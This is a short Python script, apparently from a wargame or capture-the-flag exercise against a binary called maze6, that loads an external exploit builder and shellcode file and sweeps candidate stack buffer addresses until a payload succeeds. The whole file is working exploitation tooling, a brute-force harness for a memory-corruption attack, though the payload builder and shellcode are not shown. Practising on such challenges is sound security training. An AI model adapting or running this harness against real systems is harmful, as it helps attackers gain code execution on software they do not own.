#!/usr/bin/env python3
"""Chunked sweep v2: prints progress per delta (diagnose speed), flushes every line."""
import subprocess, importlib.util, sys, time

spec = importlib.util.spec_from_file_location("exploit", "/run/screen/l6/exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

sc = open("/run/screen/l6/sc.bin", "rb").read()
path = b"/run/screen/l6/wP.txt"

start = int(sys.argv[1], 0) if len(sys.argv) > 1 else -0x20
stop = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x24

for delta in range(start, stop, 4):
    buf = 0xffffd824 + delta
    t0 = time.time()
    try:
        pay = ex.build(buf, path, sc)
    except AssertionError:
        print(hex(delta), "skip", flush=True)
        continue
    try:
        r = subprocess.run(["/maze/maze6", path, pay], capture_output=True, timeout=5)
        rc, out = r.returncode, r.stdout
    except subprocess.TimeoutExpired:
        rc, out = "HANG", b""
    dt = time.time() - t0
    tag = "HIT" if (rc == 0 and out) else ""
    print(hex(delta), hex(buf), "rc", rc, "%.1fs" % dt, tag, out[:40], flush=True)
    if tag:
        break
print("chunk", hex(start), hex(stop), "done", flush=True)
